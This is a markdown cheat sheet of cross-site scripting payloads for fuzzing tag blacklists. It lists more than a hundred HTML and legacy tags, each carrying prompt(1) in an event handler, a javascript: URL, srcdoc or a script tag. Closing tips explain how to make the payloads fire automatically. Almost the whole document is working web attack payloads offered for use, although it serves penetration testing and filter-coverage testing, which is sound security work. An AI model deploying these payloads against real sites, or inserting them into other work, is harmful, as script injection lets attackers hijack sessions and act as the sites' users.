### HTML Tag Blacklist Fuzzing List (prompt())

Purpose: Quick, exhaustive tag-based payloads to test apps that blacklist tags. These payloads place a `prompt(1)` inside the element (as content, event handlers, or JS URLs). Not all will auto-execute in a vacuum; this list is for blacklist coverage, not guaranteed execution.

Notes:
- Some tags are void/obsolete and may be sanitized/ignored; they are included to probe blacklists.
- Event attributes are used broadly; many won't fire without user interaction or extra context.
- Use in contexts where HTML is interpreted; encode/escape as needed per sink.

```html
<a href="javascript:prompt(1)">a</a>
<abbr onmouseover="prompt(1)">abbr</abbr>
<address onmouseover="prompt(1)">address</address>
<area href="javascript:prompt(1)">
<article onmouseover="prompt(1)">article</article>
<aside onmouseover="prompt(1)">aside</aside>
<audio src="x" onerror="prompt(1)"></audio>
<b onmouseover="prompt(1)">b</b>
<base href="//example.com" onmouseover="prompt(1)">
<bdi onmouseover="prompt(1)">bdi</bdi>
<bdo onmouseover="prompt(1)">bdo</bdo>
<blockquote onmouseover="prompt(1)">blockquote</blockquote>
<body onload="prompt(1)"></body>
<br onmouseover="prompt(1)">
<button onclick="prompt(1)">button</button>
<canvas onmouseover="prompt(1)">canvas</canvas>
<caption onmouseover="prompt(1)">caption</caption>
<cite onmouseover="prompt(1)">cite</cite>
<code onmouseover="prompt(1)">code</code>
<col onmouseover="prompt(1)">
<colgroup onmouseover="prompt(1)"><col></colgroup>
<data onmouseover="prompt(1)">data</data>
<datalist onmouseover="prompt(1)"><option value="x"></datalist>
<dd onmouseover="prompt(1)">dd</dd>
<del onmouseover="prompt(1)">del</del>
<details ontoggle="prompt(1)"><summary>summary</summary></details>
<dfn onmouseover="prompt(1)">dfn</dfn>
<dialog onclick="prompt(1)">dialog</dialog>
<div onclick="prompt(1)">div</div>
<dl onmouseover="prompt(1)"><dt>dt</dt><dd>dd</dd></dl>
<dt onmouseover="prompt(1)">dt</dt>
<em onmouseover="prompt(1)">em</em>
<embed src="x" onload="prompt(1)"></embed>
<fieldset onmouseover="prompt(1)">fieldset</fieldset>
<figcaption onmouseover="prompt(1)">figcaption</figcaption>
<figure onmouseover="prompt(1)">figure</figure>
<footer onmouseover="prompt(1)">footer</footer>
<form onsubmit="prompt(1)"><button type="submit">submit</button></form>
<h1 onclick="prompt(1)">h1</h1>
<h2 onclick="prompt(1)">h2</h2>
<h3 onclick="prompt(1)">h3</h3>
<h4 onclick="prompt(1)">h4</h4>
<h5 onclick="prompt(1)">h5</h5>
<h6 onclick="prompt(1)">h6</h6>
<head onmouseover="prompt(1)"></head>
<header onclick="prompt(1)">header</header>
<hr onmouseover="prompt(1)">
<html onmouseover="prompt(1)"><body></body></html>
<i onmouseover="prompt(1)">i</i>
<iframe srcdoc="<script>prompt(1)</script>"></iframe>
<img src="x" onerror="prompt(1)">
<input autofocus onfocus="prompt(1)">
<ins onmouseover="prompt(1)">ins</ins>
<kbd onmouseover="prompt(1)">kbd</kbd>
<label onclick="prompt(1)">label</label>
<legend onclick="prompt(1)">legend</legend>
<li onclick="prompt(1)">li</li>
<link rel="stylesheet" href="x" onerror="prompt(1)" onload="prompt(1)">
<main onclick="prompt(1)">main</main>
<map name="m" onclick="prompt(1)"><area href="#"></map>
<mark onclick="prompt(1)">mark</mark>
<meta http-equiv="refresh" content="0;url=javascript:prompt(1)">
<meter onmouseover="prompt(1)" value="0.5">meter</meter>
<nav onclick="prompt(1)">nav</nav>
<noscript><p onclick="prompt(1)">noscript</p></noscript>
<object onload="prompt(1)" data="data:text/html,<script>prompt(1)</script>"></object>
<ol onclick="prompt(1)"><li>1</li></ol>
<optgroup onmouseover="prompt(1)"><option>o</option></optgroup>
<option onmouseover="prompt(1)">option</option>
<output onclick="prompt(1)">output</output>
<p onclick="prompt(1)">p</p>
<picture onmouseover="prompt(1)"><img src="x" onerror="prompt(1)"></picture>
<pre onclick="prompt(1)">pre</pre>
<progress onclick="prompt(1)" max="100" value="50">progress</progress>
<q onclick="prompt(1)">q</q>
<rp onclick="prompt(1)">rp</rp>
<rt onclick="prompt(1)">rt</rt>
<ruby onclick="prompt(1)"><rt>rt</rt></ruby>
<s onclick="prompt(1)">s</s>
<samp onclick="prompt(1)">samp</samp>
<script>prompt(1)</script>
<section onclick="prompt(1)">section</section>
<select onchange="prompt(1)"><option>o</option></select>
<small onclick="prompt(1)">small</small>
<source src="x" type="application/unknown" onerror="prompt(1)">
<span onclick="prompt(1)">span</span>
<strong onclick="prompt(1)">strong</strong>
<style onmouseover="prompt(1)">/* style */</style>
<sub onclick="prompt(1)">sub</sub>
<summary onclick="prompt(1)">summary</summary>
<sup onclick="prompt(1)">sup</sup>
<table onclick="prompt(1)"><tr><td>td</td></tr></table>
<tbody onclick="prompt(1)"><tr><td>td</td></tr></tbody>
<td onclick="prompt(1)">td</td>
<template onclick="prompt(1)"><img src="x" onerror="prompt(1)"></template>
<textarea autofocus onfocus="prompt(1)">x</textarea>
<tfoot onclick="prompt(1)"><tr><td>td</td></tr></tfoot>
<th onclick="prompt(1)">th</th>
<thead onclick="prompt(1)"><tr><th>h</th></tr></thead>
<time onclick="prompt(1)">time</time>
<title onclick="prompt(1)">title</title>
<tr onclick="prompt(1)"><td>td</td></tr>
<track src="x" onerror="prompt(1)">
<u onclick="prompt(1)">u</u>
<ul onclick="prompt(1)"><li>li</li></ul>
<var onclick="prompt(1)">var</var>
<video src="x" onerror="prompt(1)"></video>
<wbr onmouseover="prompt(1)">

<!-- SVG/MathML-in-HTML integration points -->
<svg onload="prompt(1)"></svg>
<math onclick="prompt(1)"></math>

<!-- Common obsolete/legacy tags for blacklist probing -->
<acronym onclick="prompt(1)">acronym</acronym>
<applet onload="prompt(1)"></applet>
<basefont onclick="prompt(1)">basefont</basefont>
<big onclick="prompt(1)">big</big>
<blink onclick="prompt(1)">blink</blink>
<center onclick="prompt(1)">center</center>
<font onclick="prompt(1)">font</font>
<frame onload="prompt(1)"></frame>
<frameset onload="prompt(1)"><frame></frameset>
<marquee onstart="prompt(1)">marquee</marquee>
<noframes onclick="prompt(1)">noframes</noframes>
<param name="p" value="v" onmouseover="prompt(1)">
<strike onclick="prompt(1)">strike</strike>
<tt onclick="prompt(1)">tt</tt>
```

Tips:
- For interactive triggers, add `tabindex="0"` and `autofocus` to focusable elements to fire `onfocus` automatically in some contexts.
- Use `pointerover/click` in environments where interaction is possible; use `onerror/onload` and `srcdoc` where automatic triggers are needed.


